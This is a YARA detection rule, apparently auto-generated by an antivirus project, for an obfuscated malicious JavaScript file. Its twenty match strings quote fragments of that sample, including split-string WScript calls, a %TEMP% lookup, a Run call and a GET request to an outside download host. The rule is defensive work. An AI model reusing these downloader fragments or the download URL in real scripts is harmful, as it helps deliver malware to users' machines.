rule sig_20160428_1d2d1fa96bd43f0f96e38e93f6fa5b02 {
  meta:
    description = "datamaliciousorder - file 20160428_1d2d1fa96bd43f0f96e38e93f6fa5b02.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "280b6c456dd8f2acd83f4bf486d2cde2471a3e382650d97b7e03f41e804b4e57"

  strings:
    $s1  = "function WjzLucLozLkoSwxAziInn() {return WfcEtbNdjNeuZxgJlqQew[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "function QicYehVrfWkkZrrCfdVwd(FjoPhoNkaUhyDpdFxeCti){WfcEtbNdjNeuZxgJlqQew[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function QicYehVrfWkkZrrCfdVwd(FjoPhoNkaUhyDpdFxeCti){WfcEtbNdjNeuZxgJlqQew[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "var WfcEtbNdjNeuZxgJlqQew = function LwcEhtQzsNunGaaDagMuw() {return XzsEjxDbpXgsVrnGcgLhf[DagHbcGmlHlfSvaPjdAfb](\"WScript\"+\"" ascii
    $s5  = "return SjwByoVwtGboIjzUaiJmu - DqrNcxKhtFncJjaJeiEcx;};" fullword ascii
    $s6  = "function FyyHfySnnYcmFqfHvnEsn(SjwByoVwtGboIjzUaiJmu, DqrNcxKhtFncJjaJeiEcx){CeeCmoLrjBowXqwJtfIqb = CeeCmoLrjBowXqwJtfIqb * 1; " ascii
    $s7  = "LhqUowJjvGqrPysRiqXbs[DegDhnShvUoqTeuQytLxj](\"G\" + \"ET\", \"http://holy.webtm.ru/o4ksla\", false);" fullword ascii
    $s8  = "var WfcEtbNdjNeuZxgJlqQew = function LwcEhtQzsNunGaaDagMuw() {return XzsEjxDbpXgsVrnGcgLhf[DagHbcGmlHlfSvaPjdAfb](\"WScript\"+\"" ascii
    $s9  = "var XzsEjxDbpXgsVrnGcgLhf = this[\"WScript\"];" fullword ascii
    $s10 = "function WjzLucLozLkoSwxAziInn() {return WfcEtbNdjNeuZxgJlqQew[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "if (LhqUowJjvGqrPysRiqXbs[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function FyyHfySnnYcmFqfHvnEsn(SjwByoVwtGboIjzUaiJmu, DqrNcxKhtFncJjaJeiEcx){CeeCmoLrjBowXqwJtfIqb = CeeCmoLrjBowXqwJtfIqb * 1; " ascii
    $s13 = "function VtuElkWghJenRwaZocNgi(){return CeeHbuJzlPfhFvrVhcJbg + \"\";};" fullword ascii
    $s14 = "function XcvWnoEtjObgHzePvqGoc() {return ((YyqQdvDeyYmjYziLoeRwa == true) && (YyqQdvDeyYmjYziLoeRwa == ThnExyCtsLcrDsdPlzDco)) ?" ascii
    $s15 = "function XcvWnoEtjObgHzePvqGoc() {return ((YyqQdvDeyYmjYziLoeRwa == true) && (YyqQdvDeyYmjYziLoeRwa == ThnExyCtsLcrDsdPlzDco)) ?" ascii
    $s16 = "function RqyLrpGthRnkLmoXdyYma()" fullword ascii
    $s17 = "YyqQdvDeyYmjYziLoeRwa = true; " fullword ascii
    $s18 = "var YyqQdvDeyYmjYziLoeRwa = false;" fullword ascii
    $s19 = "var GtqTuwNbgImdQeiAgbXeq = false;" fullword ascii
    $s20 = "function BbbRjeYdqCqaDrmXugUna(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}